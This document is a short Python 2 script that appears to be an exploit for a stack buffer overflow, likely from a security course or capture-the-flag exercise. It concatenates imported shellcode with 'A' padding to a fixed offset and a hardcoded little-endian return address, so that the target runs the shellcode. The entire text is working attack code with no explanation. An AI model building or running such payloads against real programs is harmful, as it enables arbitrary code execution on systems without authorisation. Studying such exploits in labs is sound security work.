#!/usr/bin/python
from struct import pack
from shellcode import shellcode

toReturn = 0xbffe7bac
#print shellcode
print shellcode + "A"*(108 - len(shellcode) + 4) + pack("<I", toReturn)

